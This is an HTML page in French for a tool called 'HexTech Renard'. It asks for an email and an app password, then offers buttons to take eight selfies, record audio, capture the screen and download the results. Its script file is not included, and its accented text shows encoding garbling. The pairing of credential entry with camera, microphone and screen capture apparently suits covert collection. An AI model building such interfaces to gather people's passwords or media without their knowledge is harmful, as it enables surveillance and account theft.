<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HexTech Renard</title>
    <style>
        /* ======= Style global ======= */
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            color: #fff;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* ======= Container central ======= */
        .container { 
            max-width: 800px; 
            width: 90%;
            margin: 0 auto; 
            padding: 2rem;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
        }
        
        /* ======= Formulaire d'authentification ======= */
        #authSection { text-align: center; margin-bottom: 30px; }
        #authForm input { 
            display: block; 
            width: 100%; 
            padding: 12px 15px; 
            margin: 15px 0; 
            box-sizing: border-box;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        #authForm input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        #authForm input:focus {
            background: rgba(255, 255, 255, 0.2);
            outline: none;
            box-shadow: 0 0 10px rgba(100, 149, 237, 0.8);
            border-color: cornflowerblue;
        }

        /* ======= Boutons ======= */
        button {
            padding: 12px 25px;
            background: linear-gradient(45deg, #4CAF50, #2E8B57);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            margin: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
            opacity: 0.9;
        }

        button:disabled {
            background: #cccccc;
            transform: none;
            box-shadow: none;
            cursor: not-allowed;
        }

        /* ======= Vid√©o et Contr√¥les ======= */
        video { 
            width: 100%; 
            background: #000; 
            margin: 15px 0;
            max-height: 400px;
            border-radius: 8px;
            border: 2px solid rgba(255, 255, 255, 0.1);
        }

        .controls { 
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px; 
            margin: 20px 0;
        }

        /* ======= R√©sultats ======= */
        .progress { 
            color: #2196F3; 
            font-weight: bold; 
            margin: 10px 0;
        }

        .success { 
            color: #4CAF50;
            font-weight: bold;
        }

        .error { 
            color: #F44336;
            font-weight: bold;
        }

        #results {
            max-height: 150px;
            overflow-y: auto;
            padding: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            margin-top: 15px;
        }

        /* ======= Titre ======= */
        h2 {
            color: #4CAF50;
            text-align: center;
            margin-bottom: 25px;
            font-size: 2rem;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        /* ======= Scrollbar ======= */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.3);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Formulaire d'authentification -->
        <div id="authSection">
            <h2>‰∫óùêáùêÑùêó íã≤ùêìùêÑùêÇùêá‰∫ó</h2>
            <form id="authForm">
                <input type="email" id="email" placeholder="Email" required>
                <input type="password" id="appPassword" placeholder="Mot de passe" required>
                <button type="submit">D√©marrer la capture</button>
            </form>
        </div>

        <!-- Section capture (masqu√©e initialement) -->
        <div id="captureSection" style="display:none;">
            <video id="video" autoplay muted></video>
            <video id="screenPreview" autoplay muted style="display:none;"></video>
            
            <div class="controls">
                <button id="captureBtn">Prendre 8 selfies</button>
                <button id="audioBtn">Enregistrement audio (12s)</button>
                <button id="screenBtn">Capture √©cran (12s)</button>
                <button id="downloadBtn">T√©l√©charger fichiers</button>
            </div>
            
            <div id="results"></div>
        </div>
    </div>

    <script src="scripts.js"></script>
</body>
  </html
